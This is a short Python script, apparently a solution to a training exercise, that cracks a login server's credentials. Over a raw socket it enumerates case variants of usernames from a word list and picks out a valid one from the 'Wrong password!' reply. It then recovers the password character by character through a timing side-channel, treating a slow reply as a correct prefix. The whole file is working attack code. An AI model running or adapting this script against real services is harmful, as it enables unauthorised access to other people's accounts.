import argparse
import itertools
import json
import sys
import socket
import string
import time


def get_login(sock, logins):
    for l in logins:
        for lc in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in l))):
            sock.send(json.dumps({"login": lc, "password": ""}).encode())
            res = sock.recv(1024).decode()
            res = json.loads(res)
            if "result" in res and res["result"] == "Wrong password!":
                return lc


def crack(hostname, port, logins):
    with socket.socket() as sock:
        sock.connect((hostname, port))
        login = get_login(sock, logins)
        password = ''
        letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
        while True:
            for char in letters:
                sock.send(json.dumps({"login": login, "password": password + char}).encode())
                sent = time.time()
                res = sock.recv(1024).decode()
                received = time.time()
                res = json.loads(res)
                if "result" in res:
                    if received - sent >= 0.1:
                        password += char
                        break
                    elif res["result"] == "Connection success!":
                        return {"login": login, "password": password + char}


def read_words():
    with open('logins.txt') as f:
        return f.read().splitlines()


def main():
    parser = argparse.ArgumentParser(description="Program that cracks passwords")
    parser.add_argument("hostname", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args(sys.argv[1:])
    logins = read_words()
    if args.hostname and args.port:
        print(json.dumps(crack(args.hostname, args.port, logins)))
    else:
        print("Incorrect parameters")


if __name__ == '__main__':
    main()
